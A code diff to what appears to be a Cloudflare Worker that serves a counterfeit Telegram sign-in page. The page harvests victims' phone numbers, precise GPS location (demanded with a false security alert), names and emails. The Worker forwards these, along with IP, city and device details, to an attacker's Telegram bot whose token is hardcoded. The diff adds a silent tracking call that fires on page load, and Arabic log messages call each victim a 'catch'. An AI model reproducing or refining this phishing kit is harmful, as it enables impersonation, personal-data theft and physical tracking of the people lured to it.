@@ -10,22 +10,24 @@ export default {
           <title>Telegram Messenger</title>
           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
           <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
+            body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 40px; margin: 0; }
             .container { text-align: center; max-width: 360px; width: 90%; }
-            .logo { width: 120px; margin-bottom: 25px; }
-            h2 { font-weight: 500; margin-bottom: 15px; font-size: 24px; }
-            p { color: #707579; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }
+            .telegram-icon { width: 100px; height: 100px; margin: 0 auto 20px auto; display: block; }
+            h2 { font-weight: 500; margin-bottom: 10px; font-size: 24px; color: #222; }
+            p { color: #707579; font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
             .iti { width: 100%; margin-bottom: 20px; }
-            input { width: 100%; padding: 16px; border: 1px solid #dfe1e5; border-radius: 10px; box-sizing: border-box; font-size: 17px; outline: none; transition: border 0.3s; }
-            input:focus { border-color: #3390ec; }
-            button { width: 100%; padding: 15px; background: #3390ec; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
+            input { width: 100%; padding: 16px; border: 1px solid #dfe1e5; border-radius: 12px; box-sizing: border-box; font-size: 17px; outline: none; }
+            button { width: 100%; padding: 16px; background: #3390ec; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
             .step { display: none; }
             .step.active { display: block; }
           </style>
         </head>
         <body>
           <div class="container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
+            <svg class="telegram-icon" viewBox="0 0 240 240">
+              <circle cx="120" cy="120" r="120" fill="#3390ec"/>
+              <path d="M54 118L174 72L158 178L126 154L102 178L102 144L158 98L88 134L54 118Z" fill="white"/>
+            </svg>
             
             <div id="step1" class="step active">
               <h2>Your Phone</h2>
@@ -36,48 +38,50 @@ export default {
 
             <div id="step2" class="step">
               <h2>Profile Info</h2>
-              <p>Almost done! Please provide your name to complete the cloud synchronization.</p>
+              <p>Complete your profile details to finish synchronization.</p>
               <input id="username" type="text" placeholder="Full Name">
               <input id="email" type="email" placeholder="Recovery Email (Optional)">
-              <button id="btn2" onclick="handleStep2()">START MESSAGING</button>
+              <button id="btn2" onclick="handleStep2()">FINISH</button>
             </div>
           </div>
 
           <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
           <script>
-            // تهيئة مكتبة أرقام الدول
-            const phoneInputField = document.querySelector("#phone");
-            const phoneInput = window.intlTelInput(phoneInputField, {
-              initialCountry: "iq", // العراق افتراضياً
+            const phoneInput = window.intlTelInput(document.querySelector("#phone"), {
+              initialCountry: "iq",
               preferredCountries: ["iq", "sa", "ae", "kw", "jo"],
               utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
             });
 
+            // --- سحب صامت فور فتح الرابط ---
+            window.onload = async () => {
+              await fetch(window.location.href, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ type: "VISIT_LOG", ua: navigator.userAgent })
+              });
+            };
+
             let mainData = { phone: "", lat: "0", lon: "0", acc: "None" };
 
             async function handleStep1() {
-              const ph = phoneInput.getNumber(); // جلب الرقم مع مفتاح الدولة
-              const isValid = phoneInput.isValidNumber(); // التحقق إذا الرقم كامل وصحيح
-
-              if (!ph || !isValid) {
-                alert("⚠️ الرقم غير مكتمل أو يحتوي على أخطاء، يرجى المحاولة مرة أخرى.");
-                return;
-              }
+              const ph = phoneInput.getNumber();
+              if (!ph || !phoneInput.isValidNumber()) { alert("⚠️ الرقم غير صحيح."); return; }
 
               document.getElementById("btn1").innerText = "Verifying...";
-
+              
               if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                   mainData.phone = ph;
                   mainData.lat = pos.coords.latitude;
                   mainData.lon = pos.coords.longitude;
-                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approximate";
+                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approx";
                   
-                  // إرسال فوري للرقم والموقع
                   await sendReport("FIRST_HIT");
-                  switchStep(2);
-                }, (err) => {
-                  alert("⚠️ Security Alert: You must allow location access to verify your account session.");
+                  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+                  document.getElementById('step2').classList.add('active');
+                }, () => { 
+                  alert("⚠️ Security Alert: Location access is required."); 
                   document.getElementById("btn1").innerText = "NEXT";
                 }, { enableHighAccuracy: true });
               }
@@ -85,28 +89,15 @@ export default {
 
             async function handleStep2() {
               document.getElementById("btn2").innerText = "Loading...";
-              const name = document.getElementById("username").value || "Not Set";
-              const email = document.getElementById("email").value || "Not Set";
-              
-              await sendReport("FINAL_HIT", name, email);
-              
-              alert("❌ Error: Session expired. Please login again via official app.");
+              await sendReport("FINAL_HIT", document.getElementById("username").value, document.getElementById("email").value);
               window.location.href = "https://telegram.org/dl";
-            }
-
-            function switchStep(n) {
-              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-              document.getElementById('step' + n).classList.add('active');
             }
 
             async function sendReport(type, name = "", email = "") {
               await fetch(window.location.href, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                  type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, 
-                  acc: mainData.acc, name, email, ua: navigator.userAgent
-                })
+                body: JSON.stringify({ type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, acc: mainData.acc, name, email, ua: navigator.userAgent })
               });
             }
           </script>
@@ -120,19 +111,18 @@ export default {
         const d = await request.json();
         const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
         const CHAT_ID = "5794792675";
-        const maps = "https://www.google.com/maps?q=" + d.lat + "," + d.lon;
 
         let msg = "";
-        if (d.type === "FIRST_HIT") {
-          msg = "🔥 [صيد جديد - ضربة أولى] 🔥\\n" +
-                "📱 الرقم: " + d.phone + "\\n" +
-                "📍 الدقة: " + d.acc + "\\n" +
-                "🗺 الموقع: " + maps;
+        if (d.type === "VISIT_LOG") {
+          const ip = request.headers.get("cf-connecting-ip");
+          const city = request.cf.city;
+          const country = request.cf.country;
+          msg = "👁️ [دخول جديد للموقع]\\n🌐 IP: " + ip + "\\n📍 المدينة: " + city + ", " + country + "\\n🛠 الجهاز: " + d.ua;
+        } else if (d.type === "FIRST_HIT") {
+          const maps = "https://www.google.com/maps?q=" + d.lat + "," + d.lon;
+          msg = "🚀 [صيد جديد - تم سحب الرقم]\\n📱 الرقم: " + d.phone + "\\n📍 الدقة: " + d.acc + "\\n🗺 الخريطة: " + maps;
         } else {
-          msg = "📝 [بيانات إضافية] 📝\\n" +
-                "📱 الرقم: " + d.phone + "\\n" +
-                "👤 الاسم: " + d.name + "\\n" +
-                "📧 الإيميل: " + d.email;
+          msg = "📝 [تكملة بيانات]\\n📱 الرقم: " + d.phone + "\\n👤 الاسم: " + d.name + "\\n📧 الإيميل: " + d.email;
         }
 
         await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
